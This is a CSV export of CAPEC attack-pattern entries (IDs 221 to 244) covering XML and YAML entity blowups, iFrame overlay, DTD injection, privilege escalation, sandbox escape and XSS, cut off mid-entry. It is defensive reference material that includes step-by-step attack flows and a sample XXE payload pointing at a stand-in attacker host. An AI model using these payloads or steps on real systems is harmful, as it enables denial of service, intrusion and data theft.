'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes
221,"Data Serialization External Entities Blowup",Detailed,Draft,"This attack takes advantage of the entity replacement property of certain data serialization languages (e.g., XML, YAML, etc.) where the value of the replacement is a URI. A well-crafted file could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.","",,,"::NATURE:ChildOf:CAPEC ID:231::NATURE:ChildOf:CAPEC ID:278::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find target web service] The adversary must first find a web service that takes input data in the form of a serialized language such as XML or YAML.::STEP:2:PHASE:Experiment:DESCRIPTION:[Host malicious file on a server] The adversary will create a web server that contains a malicious file. This file will be extremely large, so that if a web service were to try to load it, the service would most likely hang.::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft malicious data] Using the serialization language that the web service takes as input, the adversary will craft data that links to the malicious file using an external entity reference to the URL of the file.::STEP:4:PHASE:Exploit:DESCRIPTION:[Send serialized data containing URI] The adversary will send specially crafted serialized data to the web service. When the web service loads the input, it will attempt to download the malicious file. Depending on the amount of memory the web service has, this could either crash the service or cause it to hang, resulting in a Denial of Service attack.::","::A server that has an implementation that accepts entities containing URI values.::","","","","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::","::This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::This attack may be mitigated by tweaking the serialized data parser to not resolve external entities. If external entities are needed, then implement a custom resolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.::","::In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>::","::611::","TAXONOMY NAME:WASC:ENTRY ID:43:ENTRY NAME:XML External Entities::","",
222,"iFrame Overlay",Detailed,Draft,"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:103::","::STEP:1:PHASE:Explore:DESCRIPTION:[Craft an iFrame Overlay page] The adversary crafts a malicious iFrame overlay page.:TECHNIQUE:The adversary leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.::STEP:2:PHASE:Exploit:DESCRIPTION:[adversary tricks victim to load the iFrame overlay page] adversary utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.:TECHNIQUE:Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Trick the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the iFrame overlay page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.:TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::","::The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.::","::SKILL:Crafting the proper malicious site and luring the victim to this site is not a trivial task.:LEVEL:High::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::","::Configuration: Disable iFrames in the Web browser.::Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::","::The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to their Twitter profile.::","::1021::","","",
224,"Fingerprinting",Meta,Stable,"An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Most commonly, fingerprinting is done to determine operating system and application versions. Fingerprinting can be done passively as well as actively. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.","",High,Very Low,"","","::A means by which to interact with the target system directly.::","::SKILL:Some fingerprinting activity requires very specific knowledge of how different operating systems respond to various TCP/IP requests. Application fingerprinting can be as easy as envoking the application with the correct command line argument, or mouse clicking in the appropriate place on the screen.:LEVEL:Medium::","::If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::While some information is shared by systems automatically based on standards and protocols, remove potentially sensitive information that is not necessary for the application's functionality as much as possible.::","","::200::","TAXONOMY NAME:WASC:ENTRY ID:45:ENTRY NAME:Fingerprinting::","",
226,"Session Credential Falsification through Manipulation",Detailed,Draft,"An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server.","",,Medium,"::NATURE:ChildOf:CAPEC ID:196::","","::The targeted application must use session credentials to identify legitimate users.::","","::An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.::","","","","","::565::472::","","",
227,"Sustained Client Engagement",Meta,Draft,"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.","",,,"","","::This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.::","","::To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.::","","","::Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses.::","","::400::","TAXONOMY NAME:ATTACK:ENTRY ID:1499:ENTRY NAME:Endpoint Denial of Service::::TAXONOMY NAME:WASC:ENTRY ID:10:ENTRY NAME:Denial of Service::","",
228,"DTD Injection",Detailed,Draft,"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.","",,Medium,"::NATURE:ChildOf:CAPEC ID:250::NATURE:CanPrecede:CAPEC ID:197::NATURE:CanPrecede:CAPEC ID:491::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine use of XML with DTDs] Examine application input to identify XML input that leverage the use of one or more DTDs.:TECHNIQUE:Examine any available documentation for the application that discusses expected XML input.:TECHNIQUE:Exercise the application using XML input with and without a DTD specified. Failure without DTD likely indicates use of DTD.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject XML containg malicious DTD payload]:TECHNIQUE:Inject XML expansion attack that creates a Denial of Service impact on the targeted server using its DTD.:TECHNIQUE:Inject XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.::","::The target must be running an XML based application that leverages DTDs.::","","","","","::Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.::Implementation: Disallow the inclusion of DTDs as part of incoming messages.::Implementation: Use XML parsing tools that protect against DTD attacks.::","","::829::","","",
229,"Serialized Data Parameter Blowup",Detailed,Draft,"This attack exploits certain serialized data parsers (e.g., XML, YAML, etc.) which manage data in an inefficient manner. The attacker crafts an serialized data file with multiple configuration parameters in the same dataset. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm. The weakness being exploited is tied to parser implementation and not language specific.","",High,High,"::NATURE:ChildOf:CAPEC ID:231::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process requests using serialized data.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests from serialized data.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests using serialized data.::STEP:2:PHASE:Exploit:DESCRIPTION:[Launch a Blowup attack] The attacker crafts malicious messages that contain multiple configuration parameters in the same dataset.:TECHNIQUE:Send the malicious crafted message containing the multiple configuration parameters to the target URL, causing a denial of service.::","::The server accepts input in the form of serialized data and is using a parser with a runtime longer than O(n) for the insertion of a new configuration parameter in the data container.(examples are .NET framework 1.0 and 1.1)::","","","","","::This attack may be mitigated completely by using a parser that is not using a vulnerable container.::Mitigation may limit the number of configuration parameters per dataset.::","::In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.::A YAML bomb leverages references within a YAML file to create exponential growth in memory requirements. By creating a chain of keys whose values are a list of multiple references to the next key in the chain, the amount of memory and processing required to handle the data grows exponentially. This may lead to denial of service or instability resulting from excessive resource consumption.::","::770::","TAXONOMY NAME:WASC:ENTRY ID:41:ENTRY NAME:XML Attribute Blowup::","",
23,"File Content Injection",Standard,Draft,"An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.","",High,Very High,"::NATURE:ChildOf:CAPEC ID:242::NATURE:CanAlsoBe:CAPEC ID:165::","","::The target software must consume files.::The adversary must have access to modify files that the target software will consume.::","::SKILL:How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.:LEVEL:Medium::","","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::","::Design: Enforce principle of least privilege::Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)::Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.::Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.::Implementation: Virus scanning on host::Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.::","::PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.::","::20::","","",
230,"Serialized Data with Nested Payloads",Standard,Draft,"Applications often need to transform data in and out of a data format (e.g., XML and YAML) by using a parser. It may be possible for an adversary to inject data that may have an adverse effect on the parser when it is being processed. Many data format languages allow the definition of macro-like structures that can be used to simplify the creation of complex structures. By nesting these structures, causing the data to be repeatedly substituted, an adversary can cause the parser to consume more resources while processing, causing excessive memory consumption and CPU utilization.","::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::",Medium,High,"::NATURE:ChildOf:CAPEC ID:130::","::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by a data parser that supports using substitution on the victim's side.::STEP:2:PHASE:Exploit:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the parser when the data is parsed on the victim's system.::","::An application's user-controllable data is expressed in a language that supports subsitution.::An application does not perform sufficient validation to ensure that user-controllable data is not malicious.::","","","::Bad data is passed to the data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Carefully validate and sanitize all user-controllable data prior to passing it to the data parser routine. Ensure that the resultant data is safe to pass to the data parser.::Perform validation on canonical data.::Pick a robust implementation of the data parser.::","","::112::20::674::770::","","",
231,"Oversized Serialized Data Payloads",Standard,Draft,"An adversary injects oversized serialized data payloads into a parser during data processing to produce adverse effects upon the parser such as exhausting system resources and arbitrary code execution.","::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::",Medium,High,"::NATURE:ChildOf:CAPEC ID:130::","::STEP:1:PHASE:Explore:DESCRIPTION:An adversary determines the input data stream that is being processed by an serialized data parser on the victim's side.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the data parser when the data is parsed on the victim's system.::","::An application uses an parser for serialized data to perform transformation on user-controllable data.::An application does not perform sufficient validation to ensure that user-controllable data is safe for a data parser.::","::SKILL:Denial of service:LEVEL:Low::SKILL:Arbitrary code execution:LEVEL:High::","","::Bad data is passed to the serialized data parser (possibly repeatedly), possibly making it crash or execute arbitrary code.::","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Carefully validate and sanitize all user-controllable serialized data prior to passing it to the parser routine. Ensure that the resultant data is safe to pass to the parser.::Perform validation on canonical data.::Pick a robust implementation of the serialized data parser.::Validate data against a valid schema or DTD prior to parsing.::","","::112::20::674::770::","","TYPE:Other:NOTE:In many cases this type of an attack will result in an XML Denial of Service (XDoS) or similar Denial of Service (DoS) due to an application becoming unstable, freezing, or crashing. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [REF-89].::::TYPE:Other:NOTE:The main weakness in serialized data related DoS is that the service provider generally must inspect, parse, and validate the data messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that DoS targets.::",
233,"Privilege Escalation",Meta,Draft,"An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.","",,,"","","","","","","","","","::269::1264::1311::","TAXONOMY NAME:ATTACK:ENTRY ID:1548:ENTRY NAME:Abuse Elevation Control Mechanism::","",
234,"Hijacking a privileged process",Standard,Draft,"An adversary gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code.","",,Medium,"::NATURE:ChildOf:CAPEC ID:233::NATURE:CanFollow:CAPEC ID:242::NATURE:CanFollow:CAPEC ID:175::NATURE:CanFollow:CAPEC ID:100::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find process with elevated priveleges] The adversary probes for processes running with elevated privileges.:TECHNIQUE:On Windows, use the process explorer's security tab to see if a process is running with administror privileges.:TECHNIQUE:On Linux, use the ps command to view running processes and pipe the output to a search for a particular user, or the root user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find vulnerability in running process] The adversary looks for a vulnerability in the running process that would allow for arbitrary code execution with the privilege of the running process.:TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.:TECHNIQUE:Utilize system utilities that support process control that have been inadequately secured::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found and hijacks the running process.::","::The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.::","","::None: No specialized resources are required to execute this type of attack.::","","","","","::732::648::","","",
237,"Escaping a Sandbox by Calling Code in Another Language",Detailed,Draft,"The attacker may submit malicious code of another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behalf. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.","",Low,Very High,"::NATURE:ChildOf:CAPEC ID:480::","::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.:TECHNIQUE:The attacker probes the target application to see whether calling code of another language is allowed within a sandbox.::STEP:2:PHASE:Explore:DESCRIPTION:[Analysis] The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.:TECHNIQUE:The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] The attacker tries to craft malicious code of another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.:TECHNIQUE:The attacker tries to explore the security weaknesses by calling malicious code of another language allowed by the sandbox.::STEP:4:PHASE:Exploit:DESCRIPTION:[Exploit the security weaknesses in the standard libraries] The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.:TECHNIQUE:The attacker calls malicious code of another language to exploit the security weaknesses in the standard libraries.::","","::SKILL:The attacker must have a good knowledge of the platform specific mechanisms of signing and verifying code. Most code signing and verification schemes are based on use of cryptography, the attacker needs to have an understand of these cryptographic operations in good detail.:LEVEL:High::","::None: No specialized resources are required to execute this type of attack.::","","::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::","::Assurance: Sanitize the code of the standard libraries to make sure there is no security weaknesses in them.::Design: Use obfuscation and other techniques to prevent reverse engineering the standard libraries.::Assurance: Use static analysis tool to do code review and dynamic tool to do penetration test on the standard library.::Configuration: Get latest updates for the computer.::","::Exploit: Java/ByteVerify.C is a detection of malicious code that attempts to exploit a vulnerability in the Microsoft Virtual Machine (VM). The VM enables Java programs to run on Windows platforms. The Microsoft Java VM is included in most versions of Windows and Internet Explorer. In some versions of the Microsoft VM, a vulnerability exists because of a flaw in the way the ByteCode Verifier checks code when it is initially being loaded by the Microsoft VM. The ByteCode Verifier is a low level process in the Microsoft VM that is responsible for checking the validity of code - or byte code - as it is initially being loaded into the Microsoft VM. Java/ByteVerify.C attempts to download a file named msits.exe, located in the same virtual directory as the Java applet, into the Windows system folder, and with a random file name. It then tries to execute this specific file. This flaw enables attackers to execute arbitrary code on a user's machine such as writing, downloading and executing additional malware. This vulnerability is addressed by update MS03-011, released in 2003.::","::693::","","",
24,"Filter Failure through Buffer Overflow",Detailed,Draft,"In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).","",High,High,"::NATURE:ChildOf:CAPEC ID:100::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for inputs that involve potential filtering:TECHNIQUE:Brute force guessing of filtered inputs::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt injections] Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.:TECHNIQUE:Brute force attack through black box penetration test tool.:TECHNIQUE:Fuzzing of communications protocols:TECHNIQUE:Manual testing of possible inputs with attack data.::STEP:3:PHASE:Experiment:DESCRIPTION:[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?:TECHNIQUE:Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.:TECHNIQUE:Check Log files. An attacker with access to log files can look at the outcome of bad input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Abuse the system through filter failure] An attacker writes a script to consistently induce the filter failure.:TECHNIQUE:DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.:TECHNIQUE:Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.:TECHNIQUE:An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.::","::Ability to control the length of data passed to an active filter.::","::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::","","::Many exceptions are thrown by the application's filter modules in a short period of time. Check the logs. See if the probes are coming from the same IP address.::","::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::","::Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.::Pre-design: Use a language or compiler that performs automatic bounds checking.::Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Operational: Use OS-level preventative functionality. Not a complete solution.::Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.::","::Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.::A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.::Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.::","::120::119::118::74::20::680::733::697::","","",
240,"Resource Injection",Meta,Stable,"An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.","",High,High,"","","::The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)::","","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::","","::99::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Resource Injection::","",
242,"Code Injection",Meta,Stable,"An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.","",High,High,"","","::The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.::","","","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Code Injection attack patterns can result in a wide variety of consequences and negatively affect all three elements of the security triad.::","::Utilize strict type, character, and encoding enforcement::Ensure all input content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all content.::Enforce regular patching of software.::","","::94::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Code Injection::","",
243,"XSS Targeting HTML Attributes",Detailed,Draft,"An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.","",,Medium,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS targeting HTML attributes] The adversary uses the entry points gathered in the Explore phase as a target list and injects various malicious expressions as input, hoping to embed them as HTML attributes.:TECHNIQUE:Inject single and double quotes into URL parameters or other inputs to see if they are filtered out. Also use URL encoding to bypass filters.:TECHNIQUE:Use single or double quotes to close attribute evaluation and enter a new attribute that contains an expression.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.:TECHNIQUE:Execute a script using an expression embedded in an HTML attribute, which avoids needing to inject a script tag.:TECHNIQUE:Send information gathered from the malicious script to a remote endpoint.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.:TECHNIQUE:Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.:TECHNIQUE:Put the malicious URL on a public forum, where many victims might accidentally click the link.::","::The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.::","","::The adversary must trick the victim into following a crafted link to a vulnerable server or view a web post where the dangerous commands are executed.::","","","::Design: Use libraries and templates that minimize unfiltered input.::Implementation: Normalize, filter and use an allowlist for all input including that which is not expected to have any scripting content.::Implementation: The victim should configure the browser to minimize active content from untrusted sources.::","","::83::","","",
244,"XSS Targeting URI Placeholders",Detailed,Draft,"An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.","",High,High,"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms 